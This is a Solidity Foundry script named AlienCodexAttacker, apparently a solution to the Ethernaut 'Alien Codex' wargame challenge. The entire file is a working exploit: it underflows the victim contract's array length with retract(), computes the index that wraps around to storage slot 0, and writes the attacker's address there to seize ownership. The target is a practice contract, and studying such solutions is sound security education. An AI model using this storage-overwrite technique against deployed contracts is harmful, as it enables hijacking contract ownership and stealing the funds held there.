// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;

    function contact() external view returns (bool);
    function owner() external view returns (address);
}

contract AlienCodexAttacker is Constants, Script {
    function run() public {
        IAlienCodex victim = IAlienCodex(ALIEN_CODEX_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }

    function attack(IAlienCodex victim) private {
        victim.makeContact();
        
        console.log("Contacted? ", victim.contact());
        console.log("Original owner: ", victim.owner());

        // underflow codex length to set it to 2**256, covering all the storage slots
        victim.retract();

        bytes32 data = bytes32(uint256(uint160(ATTACKER_ADDRESS)));
        uint256 arraySlot = 1;
        // type(uint256).max + 1 -> overflows into 0
        uint256 index = type(uint256).max - uint256(keccak256(abi.encodePacked(arraySlot))) + 1;
        victim.revise(index, data);

        console.log("New owner: ", victim.owner());
    }
}
